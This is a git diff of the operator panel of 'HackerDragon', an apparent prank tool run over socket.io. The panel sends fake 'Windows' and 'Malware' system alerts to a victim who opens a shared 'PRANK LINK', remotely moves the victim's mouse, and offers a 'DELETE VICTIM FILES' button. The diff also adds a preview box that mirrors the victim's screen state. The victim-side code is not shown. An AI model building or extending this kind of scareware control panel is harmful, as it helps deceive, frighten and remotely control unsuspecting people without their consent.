@@ -4,75 +4,61 @@
     <title>ADMIN_PANEL - HackerDragon</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        body.admin-body { background: #121212; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; }
-        .gold-glow { color: #ffd700; text-shadow: 0 0 15px #ffae00; text-transform: uppercase; letter-spacing: 2px; }
-        .toolbar { background: #000; padding: 10px 20px; display: flex; justify-content: space-between; border-bottom: 1px solid #333; align-items: center;}
-        .status-dot { color: #00ff41; margin-right: 5px; }
-        .prank-link-btn { background: #333; color: gold; border: 1px solid gold; cursor: pointer; padding: 5px 15px; font-weight: bold; }
-        .admin-container { padding: 20px; }
-        .panel-layout { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
+        body { background: #121212; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; }
+        .gold-glow { color: #ffd700; text-shadow: 0 0 15px #ffae00; text-transform: uppercase; }
+        .toolbar { background: #000; padding: 10px 20px; display: flex; justify-content: space-between; border-bottom: 1px solid #333; }
+        .prank-link-btn { background: #333; color: gold; border: 1px solid gold; cursor: pointer; padding: 5px 15px; }
+        .panel-layout { display: flex; gap: 20px; padding: 20px; justify-content: center; }
         .control-box { background: #1e1e1e; border: 1px solid #333; padding: 20px; border-radius: 8px; width: 350px; }
-        .quick-btns button { margin: 5px; padding: 10px; cursor: pointer; border: none; color: white; border-radius: 4px; font-weight: bold; }
+        .quick-btns button { margin: 5px; padding: 10px; cursor: pointer; border: none; color: white; border-radius: 4px; }
         .win-btn { background: #0078d7; }
         .red-btn { background: #aa0000; }
         .clear-btn { background: #444; }
-        
-        /* Switch Toggle */
-        .switch { position: relative; display: inline-block; width: 50px; height: 24px; vertical-align: middle;}
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #444; transition: .4s; border-radius: 24px; }
-        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: #00ff41; }
-        input:checked + .slider:before { transform: translateX(26px); }
-
-        #screen-preview { position: fixed; bottom: 20px; left: 20px; width: 240px; height: 160px; background: #000; border: 2px solid gold; }
+        #screen-preview { position: fixed; bottom: 20px; left: 20px; width: 240px; height: 160px; background: #000; border: 2px solid gold; transition: 0.5s; }
         .preview-header { background: gold; color: black; font-size: 10px; font-weight: bold; padding: 3px; }
         input[type="text"] { background: #000; border: 1px solid #333; color: #fff; padding: 8px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
+        .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #444; transition: .4s; border-radius: 20px; }
+        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #00ff41; }
+        input:checked + .slider:before { transform: translateX(20px); }
     </style>
 </head>
-<body class="admin-body">
+<body>
     <div class="toolbar">
-        <div><span class="status-dot">●</span> SYSTEM_ACTIVE</div>
+        <div><span style="color:#00ff41">●</span> SYSTEM_ACTIVE</div>
         <button onclick="copyLink()" class="prank-link-btn">PRANK LINK</button>
     </div>
-
     <div class="admin-container">
         <h1 class="gold-glow" style="text-align:center;">Hello, Admin.</h1>
         <div class="panel-layout">
             <div class="control-box">
-                <h3>FAKE_SYSTEM_ALERTS</h3>
-                <input type="text" id="alertText" placeholder="Enter custom message...">
+                <h3>ALERTS</h3>
+                <input type="text" id="alertText" placeholder="Enter message...">
                 <div class="quick-btns">
                     <button class="win-btn" onclick="sendPrank('windows')">Windows</button>
                     <button class="red-btn" onclick="sendPrank('red')">Malware</button>
                     <button class="clear-btn" onclick="sendPrank('clear')">CLEAR</button>
                 </div>
             </div>
-
             <div class="control-box">
-                <h3>REMOTE_CONTROL</h3>
-                <label class="switch">
-                    <input type="checkbox" id="mouseToggle" onchange="toggleMouse()">
-                    <span class="slider"></span>
-                </label>
-                <span style="margin-left:10px">Control Mouse</span>
-                <div style="margin-top:20px; border-top:1px solid #333; padding-top:15px;">
-                    <button class="red-btn" style="width:100%" onclick="sendPrank('delete-files')">DELETE VICTIM FILES</button>
-                </div>
+                <h3>REMOTE</h3>
+                <label class="switch"><input type="checkbox" id="mouseToggle" onchange="toggleMouse()"><span class="slider"></span></label>
+                <span>Control Mouse</span>
+                <button class="red-btn" style="width:100%; margin-top:20px;" onclick="sendPrank('delete-files')">DELETE VICTIM FILES</button>
             </div>
         </div>
     </div>
-
     <div id="screen-preview">
         <div class="preview-header">VIEWER_STREAM</div>
-        <div id="preview-content" style="color:#00ff41; font-size:12px; padding:20px; text-align:center;">
-           <p id="status">WAITING...</p>
+        <div id="preview-content" style="color:#00ff41; font-size:10px; padding:20px; text-align:center;">
+           <p id="status">OFFLINE</p>
         </div>
     </div>
-
     <script>
-        // CHANGE THIS TO YOUR BACKEND SERVER URL (Render/Railway)
-        const socket = io('https://your-back-end-service.onrender.com'); 
+        // Replace with your Render URL for GitHub deployment
+        const socket = io(); 
         socket.emit('join', 'admin');
 
         function sendPrank(type) {
@@ -91,9 +77,17 @@
             socket.emit('mouse-move-admin', { x: e.clientX, y: e.clientY });
         }
 
+        // Logic to show if viewer is online
         socket.on('viewer-status', (status) => {
-            const s = document.getElementById('status');
-            s.innerHTML = status.online ? "<span style='color:#00ff41'>LIVE_CONNECTION</span>" : "OFFLINE";
+            document.getElementById('status').innerText = status.online ? "● LIVE_CONNECTION" : "OFFLINE";
+        });
+
+        // Mirroring logic: Changes the preview box color based on victim screen
+        socket.on('mirror-update', (data) => {
+            const preview = document.getElementById('screen-preview');
+            if (data.status === 'red') preview.style.background = '#aa0000';
+            else if (data.status === 'windows') preview.style.background = '#0078d7';
+            else preview.style.background = '#000';
         });
 
         function copyLink() {
